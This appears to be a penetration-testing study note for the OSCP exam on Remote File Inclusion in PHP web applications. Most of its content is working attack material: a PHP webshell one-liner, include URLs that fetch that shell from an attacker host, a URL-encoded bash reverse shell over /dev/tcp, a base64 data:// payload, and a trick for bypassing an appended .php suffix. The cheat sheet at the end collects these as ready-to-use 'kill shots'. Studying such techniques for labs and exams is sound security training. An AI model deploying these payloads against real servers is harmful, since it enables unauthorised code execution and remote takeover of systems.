# 💥 Remote File Inclusion (RFI)

> Like [[LFI]], but the include parameter accepts a **remote URL** — so the server fetches and executes **your** file, giving instant RCE. Rarer than LFI (requires permissive config), but a direct win when present. Detect by feeding a URL to your own box and watching for the request.

Related: [[LFI]] · [[Web Exploitation]] · [[HTTP]] · [[Shells]] · [[SSRF]]

---

## 🧠 A FILE/PAGE PARAM THAT TAKES URLS → THINK
- **Point it at your box:** `?page=http://10.10.14.5/test.txt` → does the server fetch it?
- **PHP:** needs `allow_url_include=On` (and usually `allow_url_fopen=On`). Often off on modern boxes → fall back to [[LFI]].
- Host a **PHP payload** on your Kali → the target executes it → RCE.
- Also works with `data://` / SMB (`\\IP\share\shell.php`) in some stacks.

## ⚡ DETECTION
Start a listener/web server, then include a URL to it:
```bash
python3 -m http.server 80
```
```
http://$IP/index.php?page=http://10.10.14.5/probe.txt
```
**Look for:** a GET request for `probe.txt` in your web-server log = the target is fetching remote content (RFI likely). If `probe.txt` contents render, inclusion works.

## 📖 WHAT / WHY
- **What:** the include/require path accepts an external URL; the fetched content is then executed in the app's context.
- **Why it works:** `include($_GET['page'])` with URL wrappers enabled pulls remote code.
- **Prereqs (PHP):** `allow_url_include=On`. If off → not RFI; use [[LFI]] techniques instead.

## 💥 EXPLOITATION → RCE
Host a PHP webshell on Kali:
```bash
echo '<?php system($_GET["c"]); ?>' > shell.php
```
```bash
python3 -m http.server 80
```
Include it and run commands:
```
http://$IP/index.php?page=http://10.10.14.5/shell.php&c=id
```
Go straight to a reverse shell:
```bash
nc -lvnp 443
```
```
http://$IP/index.php?page=http://10.10.14.5/shell.php&c=bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/10.10.14.5/443%200>%261'
```
**Bypass a `.php` suffix appended by the app:** add a `?` or `#` so the suffix is treated as a query on your URL:
```
?page=http://10.10.14.5/shell.txt?          (trailing ? swallows the appended ".php")
```
**Alternatives:** `data://text/plain;base64,<b64 php>&c=id`; SMB include `\\10.10.14.5\s\shell.php` (Windows/PHP on Windows).
**Result:** shell as the web user → [[Shells]] → privesc.

## 🔁 FOUND → NEXT
| FINDING | MEANING | NEXT | RESULT |
|---|---|---|---|
| Server fetches your URL | RFI likely | host PHP shell → include | RCE |
| Your PHP executes | RCE confirmed | reverse shell | shell |
| Fetch happens, no exec | `allow_url_include` off | use `data://` or fall back to [[LFI]] | read/RCE |
| `.php` appended | Suffix issue | trailing `?`/`#`, or `.txt` payload | RCE |
| Only internal URLs fetched | It's [[SSRF]], not RFI | pivot to SSRF | internal access |

## 🚧 FAILED → NEXT
| Problem | Do this |
|---|---|
| No request to your box | RFI disabled — switch to [[LFI]] (log/session poisoning, php://filter) |
| Fetch but no code run | `allow_url_include` off — try `data://`; else [[LFI]]→RCE |
| Egress blocked (target can't reach you) | Host on port 80/443; check firewall; try SMB include on Windows |
| `.php` suffix breaks URL | Append `?`/`#`; name payload accordingly |
| Reverse shell won't fire | Change port, try other one-liners, `curl\|bash` → [[Shells]] |

## 🧹 POST-EXPLOITATION
Stabilise ([[Shells]]); loot webroot configs → [[Credential Attacks]]; privesc.

## ⚠️ COMMON MISTAKES
- Assuming RFI when it's actually **[[LFI]]** or **[[SSRF]]** — confirm the server executes *your* code.
- Hosting the payload on a port the target can't reach (use 80/443).
- Forgetting the **trailing `?`** trick when the app appends `.php`.
- Not falling back to LFI when `allow_url_include` is off.

## 🧭 OSCP EXAM MINDSET
RFI is the easy sibling of LFI: if the server will fetch and run your file, you host a webshell and you're in. But it's frequently disabled on modern PHP — don't burn time; a quick `?page=http://you/probe.txt` tells you. No callback → treat it as LFI and use log/filter tricks instead.

## ✅ DON'T MISS
- [ ] Probe with a URL to your own web server (watch the log)
- [ ] Host a PHP shell on port 80/443
- [ ] Trailing `?`/`#` if `.php` is appended
- [ ] `data://` fallback; SMB include on Windows
- [ ] Fall back to [[LFI]] if `allow_url_include` is off

## 📇 CHEAT SHEET
```bash
echo '<?php system($_GET["c"]); ?>' > shell.php && python3 -m http.server 80
```
```
?page=http://10.10.14.5/shell.php&c=id
```
```
?page=http://10.10.14.5/shell.txt?               # defeats appended .php
```
```
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+&c=id
```
**Kill shots:** host PHP shell → include your URL → `?c=` RCE → reverse shell.
